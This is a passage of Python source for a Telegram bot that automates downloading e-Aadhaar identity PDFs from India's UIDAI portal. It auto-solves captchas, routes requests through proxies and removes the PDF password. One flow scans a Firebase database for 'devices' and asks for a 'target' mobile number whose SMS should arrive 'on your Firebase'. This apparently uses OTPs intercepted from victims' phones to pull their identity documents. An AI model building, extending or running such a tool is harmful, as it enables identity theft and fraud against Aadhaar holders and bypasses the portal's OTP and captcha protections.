                f"<i>💡 ᴘʟᴇᴀsᴇ ᴇɴsᴜʀᴇ ʏᴏᴜʀ ғɪʀᴇʙᴀsᴇ ʀᴛᴅʙ ɪs ᴘᴜʙʟɪᴄ (ʀᴇᴀᴅ ᴀᴄᴄᴇss ᴇɴᴀʙʟᴇᴅ) ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.</i>",
                reply_markup=get_cancel_keyboard()
            )
            return

        if found_mobile:
            if temp_id:
                delete_message(chat_id, temp_id)
            update_session_data(chat_id, 'fb_url', found_url)
            update_session_data(chat_id, 'fb_mobile', found_mobile)
            set_session(chat_id, 'downloading', get_session(chat_id)['data'])
            worker_pool.submit(_handle_firebase_download_worker, chat_id, found_mobile, found_url)
            return
        else:
            update_session_data(chat_id, 'fb_url', found_url)
            ok_scan, scan_data = bot.scan_firebase_devices(found_url)
            if temp_id:
                delete_message(chat_id, temp_id)

            if ok_scan and scan_data.get('devices'):
                set_session(chat_id, 'fb_devices_menu', {
                    'fb_url': found_url,
                    'devices': scan_data['devices'],
                    'page': 0
                })
                show_firebase_devices_menu(chat_id, page=0)
                return
            else:
                set_session(chat_id, 'awaiting_fb_mobile', get_session(chat_id)['data'])
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>🥷 ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ</b>\n\n"
                    f"✅  <b>ғɪʀᴇʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!</b>\n"
                    f"🌐  <code>{found_url}</code>\n\n"
                    f"⚠️  <i>ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ᴅᴇᴠɪᴄᴇ ᴀᴜᴛᴏ-ᴅᴇᴛᴇᴄᴛ ɴᴀʜɪ ʜᴜᴀ.</i>\n\n"
                    f"📱  <b>ᴀʙ ᴛᴀʀɢᴇᴛ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴏ:</b>\n\n"
                    f"💡  <i>ʏᴇʜ ɴᴜᴍʙᴇʀ ᴀᴀᴅʜᴀᴀʀ sᴇ ʟɪɴᴋ ʜᴏɴᴀ ᴄʜᴀʜɪʏᴇ ᴀᴜʀ ɪsᴋᴀ sᴍs ᴀᴀᴘᴋᴇ ғɪʀᴇʙᴀsᴇ ᴘᴀʀ ᴀᴀɴᴀ ᴄʜᴀʜɪʏᴇ.</i>",
                    reply_markup=get_cancel_keyboard()
                )
                return

    if current_step == 'awaiting_fb_mobile':
        mobile_candidate = re.sub(r'\D', '', message_text.strip())
        if len(mobile_candidate) == 12 and mobile_candidate.startswith('91'):
            mobile_candidate = mobile_candidate[2:]
        if len(mobile_candidate) != 10 or not mobile_candidate.isdigit():
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌  <b>ɪɴᴠᴀʟɪᴅ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ.</b>\n\n"
                f"▸  ᴍᴜsᴛ ʙᴇ ᴇxᴀᴄᴛʟʏ 10 ᴅɪɢɪᴛs\n"
                f"▸  ᴇxᴀᴍᴘʟᴇ: <code>9876543210</code>",
                reply_markup=get_cancel_keyboard()
            )
            return

        d = get_session(chat_id)['data']
        fb_url = d.get('fb_url')
        if not fb_url:
            clear_session(chat_id)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ Session reset. Please start again.", reply_markup=get_welcome_inline_keyboard())
            return

        update_session_data(chat_id, 'fb_mobile', mobile_candidate)
        set_session(chat_id, 'downloading', get_session(chat_id)['data'])
        worker_pool.submit(_handle_firebase_download_worker, chat_id, mobile_candidate, fb_url)
        return

    # ── MOBILE NUMBER FLOW ───────────────────────────────
    if current_step == 'awaiting_mobile':
        parts = message_text.strip().split(None, 1)
        mobile_candidate = re.sub(r'\D', '', parts[0])
        if len(mobile_candidate) == 12 and mobile_candidate.startswith('91'):
            mobile_candidate = mobile_candidate[2:]
        if len(mobile_candidate) != 10 or not mobile_candidate.isdigit():
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌  ɪɴᴠᴀʟɪᴅ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ.\n\n"
                f"▸  ᴍᴜsᴛ ʙᴇ ᴇxᴀᴄᴛʟʏ 10 ᴅɪɢɪᴛs\n"
                f"▸  ᴇxᴀᴍᴘʟᴇ: <code>9876543210</code>",
                reply_markup=get_cancel_keyboard()
            )
            return

        name = parts[1].strip() if len(parts) > 1 and len(parts[1].strip()) >= 2 else "Mr"
        update_session_data(chat_id, 'mobile', mobile_candidate)
        update_session_data(chat_id, 'name', name)

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ & sᴇɴᴅɪɴɢ ᴏᴛᴘ…</i>")

        ok, otp_txn, code, c_txn, t_id, err = bot.auto_send_eid_otp(chat_id, mobile_candidate, name)
        if not ok:
            clear_session(chat_id)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err or 'Failed to send OTP'}</b>\n\n<i>Please check the mobile number and try again.</i>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'eid_otp_txn_id', otp_txn)
        update_session_data(chat_id, 'captcha_code', code)
        update_session_data(chat_id, 'captcha_txn_id', c_txn)
        update_session_data(chat_id, 'transaction_id', t_id)
        set_session(chat_id, 'awaiting_eid_otp', get_session(chat_id)['data'])

        masked_mobile = f"{mobile_candidate[:2]}******{mobile_candidate[-2:]}"
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"📱  ᴍᴏʙɪʟᴇ  ·  <code>{masked_mobile}</code>\n"
            f"⏰  ᴠᴀʟɪᴅ   ·  10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    if current_step == 'awaiting_name':
        name = message_text.strip()
        if len(name) < 2:
            name = "Mr"

        update_session_data(chat_id, 'name', name)
        d = get_session(chat_id)['data']
        mobile = d.get('mobile')

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ & sᴇɴᴅɪɴɢ ᴏᴛᴘ…</i>")

        ok, otp_txn, code, c_txn, t_id, err = bot.auto_send_eid_otp(chat_id, mobile, name)
        if not ok:
            clear_session(chat_id)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err or 'Failed to send OTP'}</b>\n\n<i>Please check the mobile number and try again.</i>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'eid_otp_txn_id', otp_txn)
        update_session_data(chat_id, 'captcha_code', code)
        update_session_data(chat_id, 'captcha_txn_id', c_txn)
        update_session_data(chat_id, 'transaction_id', t_id)
        set_session(chat_id, 'awaiting_eid_otp', get_session(chat_id)['data'])

        masked_mobile = f"{mobile[:2]}******{mobile[-2:]}"
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"📱  ᴍᴏʙɪʟᴇ  ·  <code>{masked_mobile}</code>\n"
            f"⏰  ᴠᴀʟɪᴅ   ·  10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    if current_step == 'awaiting_eid_otp':
        otp = re.sub(r'\D', '', message_text.strip())
        if len(otp) != 6:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Invalid OTP. Must be 6 digits.", reply_markup=get_cancel_keyboard())
            return

        d = get_session(chat_id)['data']
        mobile       = d.get('mobile')
        name         = d.get('name', 'Mr')
        otp_txn_id   = d.get('eid_otp_txn_id')
        c_txn        = d.get('captcha_txn_id')
        captcha_code = d.get('captcha_code')

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Verifying OTP and retrieving EID…</i>")

        res = bot.verify_eid_otp(
            chat_id, mobile, name, otp, otp_txn_id, c_txn, captcha_code
        )
        if len(res) == 4:
            success, eid_number, verified_name, dob = res
        else:
            success, eid_number, verified_name = res
            dob = None

        if not success:
            clear_session(chat_id)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{verified_name or 'Verification failed'}</b>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'eid_number', eid_number)
        update_session_data(chat_id, 'id_value', eid_number)
        update_session_data(chat_id, 'verified_name', verified_name or name)
        if dob:
            update_session_data(chat_id, 'dob', dob)

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Auto-solving download captcha…</i>")
        dl_res = bot.auto_send_aadhaar_otp(chat_id, eid_number)
        ok = dl_res[0]
        if not ok:
            clear_session(chat_id)
            err = dl_res[5] if len(dl_res) > 5 else "Failed to send download OTP."
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  {err}", reply_markup=get_menu_keyboard())
            return

        dl_otp_txn = dl_res[1]
        dl_t_id = dl_res[4]
        sticky_proxy = dl_res[6] if len(dl_res) > 6 else None

        update_session_data(chat_id, 'download_otp_txn_id', dl_otp_txn)
        update_session_data(chat_id, 'dl_transaction_id', dl_t_id)
        if sticky_proxy:
            update_session_data(chat_id, 'sticky_proxy', sticky_proxy)
        set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>✅ ᴇɪᴅ ʀᴇᴛʀɪᴇᴠᴇᴅ</b>\n\n"
            f"👤  <b>ɴᴀᴍᴇ</b>  ·  {verified_name or name}\n"
            f"🔢  <b>ᴇɪᴅ</b>   ·  <code>{eid_number}</code>\n\n"
            f"{DIVIDER}\n"
            f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    # ── AADHAAR NUMBER FLOW ──────────────────────────────
    if current_step == 'awaiting_aadhaar':
        parts = message_text.strip().split(None, 1)
        aadhaar = re.sub(r'\D', '', parts[0])
        if len(aadhaar) != 12 or not aadhaar.isdigit():
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Invalid Aadhaar number. Must be 12 digits.", reply_markup=get_cancel_keyboard())
            return

        update_session_data(chat_id, 'aadhaar_number', aadhaar)
        update_session_data(chat_id, 'id_value', aadhaar)

        if len(parts) > 1 and len(parts[1].strip()) >= 2:
            name = parts[1].strip()
            update_session_data(chat_id, 'verified_name', name)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ & sᴇɴᴅɪɴɢ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ…</i>")
            dl_res = bot.auto_send_aadhaar_otp(chat_id, aadhaar)
            if not dl_res[0]:
                clear_session(chat_id)
                err = dl_res[5] if len(dl_res) > 5 else "Failed to send OTP"
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err}</b>", reply_markup=get_menu_keyboard())
                return

            update_session_data(chat_id, 'download_otp_txn_id', dl_res[1])
            update_session_data(chat_id, 'dl_transaction_id', dl_res[4])
            if len(dl_res) > 6 and dl_res[6]:
                update_session_data(chat_id, 'sticky_proxy', dl_res[6])
            set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
                f"▸  Sent to your registered mobile number\n"
                f"⏰  Valid for 10 minutes\n\n"
                f"{DIVIDER}\n"
                f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
                reply_markup=get_cancel_keyboard()
            )
            return

        set_session(chat_id, 'awaiting_name_aadhaar', get_session(chat_id)['data'])
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>👤 ғᴜʟʟ ɴᴀᴍᴇ</b>\n\n▸ Enter your name as printed on Aadhaar", reply_markup=get_cancel_keyboard())
        return

    if current_step == 'awaiting_name_aadhaar':
        name = message_text.strip()
        if len(name) < 2:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Name too short. Enter full name.", reply_markup=get_cancel_keyboard())
            return

        update_session_data(chat_id, 'verified_name', name)
        d = get_session(chat_id)['data']
        aadhaar = d.get('aadhaar_number')
        
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Auto-solving captcha & sending download OTP…</i>")
        dl_res = bot.auto_send_aadhaar_otp(chat_id, aadhaar)
        if not dl_res[0]:
            clear_session(chat_id)
            err = dl_res[5] if len(dl_res) > 5 else "Failed to send OTP"
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err}</b>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'download_otp_txn_id', dl_res[1])
        update_session_data(chat_id, 'dl_transaction_id', dl_res[4])
        if len(dl_res) > 6 and dl_res[6]:
            update_session_data(chat_id, 'sticky_proxy', dl_res[6])
        set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"▸  Sent to your registered mobile number\n"
            f"⏰  Valid for 10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    # ── EID INPUT FLOW ───────────────────────────────────
    if current_step == 'awaiting_eid_input':
        eid_clean = message_text.strip().replace('/', '').replace(' ', '')
        if len(eid_clean) not in (14, 28):
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Invalid EID format.\n▸ Standard EID: 14 digits or 28 digits", reply_markup=get_cancel_keyboard())
            return

        update_session_data(chat_id, 'eid_number', eid_clean)
        set_session(chat_id, 'awaiting_name_eid', get_session(chat_id)['data'])
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>👤 ғᴜʟʟ ɴᴀᴍᴇ</b>\n\n▸ Enter your name as on EID slip", reply_markup=get_cancel_keyboard())
        return

    if current_step == 'awaiting_name_eid':
        name = message_text.strip()
        if len(name) < 2:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Name too short.", reply_markup=get_cancel_keyboard())
            return

        update_session_data(chat_id, 'verified_name', name)
        d = get_session(chat_id)['data']
        eid_clean = d.get('eid_number')

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Auto-solving captcha & sending download OTP…</i>")
        dl_res = bot.auto_send_aadhaar_otp(chat_id, eid_clean)
        if not dl_res[0]:
            clear_session(chat_id)
            err = dl_res[5] if len(dl_res) > 5 else "Failed to send OTP"
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err}</b>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'download_otp_txn_id', dl_res[1])
        update_session_data(chat_id, 'dl_transaction_id', dl_res[4])
        if len(dl_res) > 6 and dl_res[6]:
            update_session_data(chat_id, 'sticky_proxy', dl_res[6])
        set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"▸  Sent to your registered mobile number\n"
            f"⏰  Valid for 10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    # ── DOWNLOAD CAPTCHA FLOW ────────────────────────────
    if current_step == 'awaiting_download_captcha':
        captcha_value = message_text.strip()
        d = get_session(chat_id)['data']
        id_val = d.get('id_value') or d.get('eid_number') or d.get('aadhaar_number')
        c_txn  = d.get('dl_captcha_txn_id')
        t_id   = d.get('dl_transaction_id')

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Sending Aadhaar download OTP…</i>")

        success, otp_txn_id, msg = bot.send_aadhaar_otp(chat_id, id_val, captcha_value, c_txn, t_id)
        if not success:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{msg}</b>\n\n<i>Loading new captcha…</i>")
            img_bytes, new_c_txn, new_t_id = bot.get_captcha(chat_id)
            if img_bytes:
                update_session_data(chat_id, 'dl_captcha_txn_id', new_c_txn)
                update_session_data(chat_id, 'dl_transaction_id', new_t_id)
                send_photo(chat_id, img_bytes, caption=f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🖼️ ɴᴇᴡ ᴄᴀᴘᴛᴄʜᴀ</b>", reply_markup=get_cancel_keyboard())
            else:
                clear_session(chat_id)
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Failed to get captcha.", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'download_otp_txn_id', otp_txn_id)
        set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"▸  Sent to your registered mobile number\n"
            f"⏰  Valid for 10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  Enter the 6-digit OTP to download your PDF.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    # ── FINAL OTP & PDF DOWNLOAD ─────────────────────────
    if current_step == 'awaiting_final_otp':
        otp = re.sub(r'\D', '', message_text.strip())
        if len(otp) != 6:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Invalid OTP. Must be 6 digits.", reply_markup=get_cancel_keyboard())
            return

        d = get_session(chat_id)['data']
        id_val     = d.get('id_value') or d.get('eid_number') or d.get('aadhaar_number')
        otp_txn_id = d.get('download_otp_txn_id')
        t_id       = d.get('dl_transaction_id')
        verified_n = d.get('verified_name', 'Mr.')
        sticky_p   = d.get('sticky_proxy')

        set_session(chat_id, 'downloading', d)

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<i>⏳  Downloading e-Aadhaar PDF from UIDAI…</i>"
        )

        success, pdf_res = bot.download_aadhaar_pdf(chat_id, id_val, otp, otp_txn_id, t_id, sticky_proxy=sticky_p)
        if not success:
            clear_session(chat_id)
            err_msg = html.escape(str(pdf_res or "Download failed"))
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>❌ ᴅᴏᴡɴʟᴏᴀᴅ ғᴀɪʟᴇᴅ</b>\n\n"
                f"⚠️  {err_msg}",
                reply_markup=get_menu_keyboard()
            )
            return

        def _safe_deliver(cid, path, name):
            try:
                deliver_pdf(cid, path, name)
            except Exception as ex:
                logger.error(f"Error in deliver_pdf for chat {cid}: {ex}", exc_info=True)

        worker_pool.submit(_safe_deliver, chat_id, pdf_res, verified_n)
        return

    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n\n"
        f"<i>📲 sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ғʀᴏᴍ ᴛʜᴇ ᴍᴇɴᴜ ʙᴇʟᴏᴡ:</i>",
        reply_markup=get_welcome_inline_keyboard()
    )

# ============== GET UPDATES ==============
def get_updates(offset=None):
    url    = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {'timeout': 10, 'allowed_updates': ['message', 'callback_query']}
    if offset:
        params['offset'] = offset
    try:
        response = get_polling_session().get(url, params=params, timeout=15)
        result   = response.json()
        if result.get('ok'):
            return result.get('result', [])
        return []
    except Exception as e:
        logger.error(f"Error getting updates: {e}")
        return []

# ============== MAIN ==============
def _safe_handle_callback(cid, cqid, data, mid, u):
    try:
        handle_callback(cid, cqid, data, message_id=mid, user_info=u)
    except Exception as e:
        logger.error(f"Error handling callback for chat {cid}: {e}", exc_info=True)

def _safe_handle_message(cid, text, mid, u):
    try:
        handle_message(cid, text, message_id=mid, user_info=u)
    except Exception as e:
        logger.error(f"Error handling message for chat {cid}: {e}", exc_info=True)

def _safe_handle_start(cid, mid, text, u):
    try:
        if is_force_check_enabled() and not is_channel_member(cid):
            send_message(
                cid,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>📢 ᴊᴏɪɴ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ</b>\n\n"
                f"🔒  ʙᴏᴛ ᴋᴏ ᴜsᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ʜᴜᴍᴀʀᴇ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ ᴋᴏ ᴊᴏɪɴ ᴋᴀʀɴᴀ ᴢᴀʀᴏᴏʀɪ ʜᴀɪ.\n\n"
                f"{DIVIDER}\n"
                f"<i>👇  ɴᴇᴇᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ʙᴜᴛᴛᴏɴ sᴇ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ ᴀᴜʀ '✅ ɪ ʜᴀᴠᴇ ᴊᴏɪɴᴇᴅ' ᴅᴀʙᴀʏᴇɪɴ.</i>",
                reply_markup=get_join_keyboard()
            )
            return

        ensure_user(
            cid,
            first_name=u.get('first_name'),
            last_name=u.get('last_name'),
            username=u.get('username')
        )
        clear_session(cid)
        remove_reply_keyboard(cid)

        send_message(
            cid,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n\n"
            f"<b>🇮🇳 ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ — sᴛʀᴀɪɢʜᴛ ᴛᴏ ᴛᴇʟᴇɢʀᴀᴍ</b>\n\n"
            f"⚡  sᴏᴜʀᴄᴇ    ·  ᴏғғɪᴄɪᴀʟ ᴜɪᴅᴀɪ ᴘᴏʀᴛᴀʟ\n"
            f"🔓  ᴅᴇʟɪᴠᴇʀʏ  ·  ᴀᴜᴛᴏ-ᴜɴʟᴏᴄᴋᴇᴅ, ɴᴏ ᴘᴀssᴡᴏʀᴅ\n"
            f"⚡  ᴍᴇᴛʜᴏᴅs   ·  ᴍᴏʙɪʟᴇ  ·  ᴀᴀᴅʜᴀᴀʀ  ·  ᴇɪᴅ  ·  ғɪʀᴇʙᴀsᴇ\n\n"
            f"{DIVIDER}\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ ʙᴇɢɪɴ.</i>",
            reply_markup=get_welcome_inline_keyboard()
        )
        try:
            set_message_reaction(cid, message_id=mid, emoji="⚡")
        except Exception:
            pass
    except Exception as e:
        logger.error(f"Error handling start for chat {cid}: {e}", exc_info=True)

def main():
    print("━" * 55)
    print(f"  {BOT_NAME}  —  Starting Up (v3.0 Free & Bot API 10.4 Ready)")
    print("━" * 55)

    if not TELEGRAM_BOT_TOKEN:
        print("❌ TELEGRAM_BOT_TOKEN is not set in .env")
        return

    try:
        r = get_telegram_session().get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe", timeout=10)
        bot_info = r.json()
        if bot_info.get('ok'):
            username = bot_info['result']['username']
            global _bot_username
            _bot_username = username
            print(f"✅  Online     @{username}")
            print(f"📁  Database   MongoDB ({database.MONGO_DB_NAME})")
            print(f"👑  Owner      {OWNER_ID}")
            print(f"🛡️  Admins     {', '.join(str(a) for a in ADMIN_IDS)}")
        else:
            print(f"❌  Telegram Bot authentication failed: {bot_info}")
            return
    except Exception as e:
        print(f"❌  Connection Error: {e}")
        return

    t = threading.Thread(target=_cleanup_sessions, daemon=True)
    t.start()

    global worker_pool
    worker_pool = ThreadPoolExecutor(max_workers=25, thread_name_prefix="tg_worker")

    print("━" * 55)
    print("  🟢 Running  —  Ready to accept users")
    print("━" * 55)

    last_update_id = 0

    while True:
        try:
            updates = get_updates(last_update_id + 1)
            for update in updates:
                last_update_id = update.get('update_id')

                if 'callback_query' in update:
                    cq   = update['callback_query']
                    cid  = cq['message']['chat']['id']
                    cqid = cq['id']
                    data = cq.get('data', '')
                    mid  = cq.get('message', {}).get('message_id')
                    u    = cq.get('from', {})
                    worker_pool.submit(_safe_handle_callback, cid, cqid, data, mid, u)

                elif 'message' in update:
                    msg  = update['message']
                    cid  = msg['chat']['id']
                    mid  = msg.get('message_id')
                    text = msg.get('text', '').strip()
                    u    = msg.get('from', {})
                    if not text:
                        continue

                    if text.startswith('/start'):
                        worker_pool.submit(_safe_handle_start, cid, mid, text, u)
                    else:
                        worker_pool.submit(_safe_handle_message, cid, text, mid, u)

            if not updates:
                time.sleep(0.05)

        except KeyboardInterrupt:
            print("\n🛑 Stopped by User")
            break
        except Exception as e:
            logger.error(f"Main loop error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()
